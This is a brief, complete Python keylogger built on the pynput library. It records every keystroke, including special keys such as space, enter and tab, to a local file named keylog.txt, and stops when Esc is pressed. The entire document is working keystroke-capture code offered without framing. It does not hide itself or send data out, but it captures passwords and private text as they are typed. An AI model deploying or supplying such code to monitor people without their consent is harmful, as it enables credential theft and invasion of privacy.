from pynput.keyboard import Listener


log_file = "keylog.txt"


def on_press(key):
    try:
       
        with open(log_file, "a") as f:
            
            f.write(f"{key.char}")
    except AttributeError:
        
        with open(log_file, "a") as f:
            if key == key.space:
                f.write(" [SPACE] ")
            elif key == key.enter:
                f.write(" [ENTER]\n")
            elif key == key.tab:
                f.write(" [TAB] ")
            else:
                f.write(f" [{key}] ")


def on_release(key):
    
    if key == key.esc:
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
